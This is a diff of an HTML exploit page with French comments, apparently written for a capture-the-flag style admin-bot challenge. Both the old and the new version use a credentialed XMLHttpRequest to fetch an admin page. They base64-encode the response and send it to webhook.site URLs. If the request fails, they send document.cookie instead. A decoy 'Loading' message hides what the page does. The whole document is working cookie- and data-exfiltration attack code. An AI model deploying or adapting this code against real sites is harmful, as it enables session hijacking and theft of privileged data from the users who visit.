@@ -1,30 +1,33 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>Chargement en cours...</h1>
-    <form id="exploitForm" action="https://webhook.site/acaf3170-8841-43f5-ae68-66bf0533b010" method="POST">
-        <input type="hidden" name="admin_content" id="admin_content">
-    </form>
-
     <script>
-        // On essaie de récupérer la page admin
-        var xhr = new XMLHttpRequest();
-        xhr.open("GET", "http://192.168.132.208:9223/admin", true);
-        xhr.withCredentials = true; // Très important pour envoyer les cookies du bot
-        
-        xhr.onload = function() {
-            // On met le code source de l'admin dans le formulaire
-            document.getElementById('admin_content').value = btoa(xhr.responseText);
-            // On envoie le formulaire automatiquement vers ton webhook
-            document.getElementById('exploitForm').submit();
-        };
+        (function() {
+            var target = "http://192.168.132.208:9223/admin";
+            var webhook = "	http://webhook.site/32a51fe3-e905-4766-8511-9e0521376bb2"; // UTILISE TON ADRESSE ICI
 
-        xhr.onerror = function() {
-            // Si le GET échoue (CORS), on tente une redirection directe avec le cookie
-            location.href = "https://webhook.site/acaf3170-8841-43f5-ae68-66bf0533b010?cookie=" + document.cookie;
-        };
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", target, true);
+            xhr.withCredentials = true; // Indispensable pour porter les cookies de l'admin
 
-        xhr.send();
+            xhr.onload = function() {
+                // On récupère le code source de la page admin
+                var pageContent = xhr.responseText;
+                var report = btoa(unescape(encodeURIComponent(pageContent))).substring(0, 2000);
+                
+                // Envoi via Image (Ta méthode préférée)
+                var img = new Image();
+                img.src = webhook + "?exfil=" + report;
+            };
+
+            xhr.onerror = function() {
+                // Si le GET est bloqué, on tente au moins d'envoyer les cookies via redirection
+                location.href = webhook + "?cookie_fallback=" + btoa(document.cookie);
+            };
+
+            xhr.send();
+        })();
     </script>
+    <p>Loading, please wait...</p>
 </body>
 </html>
